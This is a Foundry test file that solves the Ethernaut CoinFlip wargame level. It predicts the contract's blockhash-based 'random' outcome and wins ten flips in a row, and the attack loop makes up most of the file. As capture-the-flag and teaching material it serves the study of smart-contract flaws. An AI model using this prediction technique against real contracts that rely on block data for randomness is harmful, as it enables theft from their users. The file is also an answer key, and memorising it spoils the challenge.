// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/03-CoinFlip/CoinFlipFactory.sol";
import "../core/Ethernaut.sol";

contract CoinFlipTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // It is possible to guess 10 flips in a row by replicating the pseudo random algorithm
        // In the CoinFlip contract, the value to guess depends on the block.number
        // It is needed to wait a new block before submitting a new guess
        // It is emulated thank to vm.roll in foundry

        // 1. Declare variables
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue;
        uint256 coinFlip;
        bool side;
        // 2. Loop
        for (uint256 i; i < 10; i++) {
            // 2.a Update variable at each loop
            blockValue = uint256(blockhash(block.number - 1));
            coinFlip = blockValue / FACTOR;
            side = coinFlip == 1 ? true : false;
            // 2.b call the contract with the guess
            ethernautCoinFlip.flip(side);
            // 2.c emulate a new block
            vm.roll(block.number + 1);
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
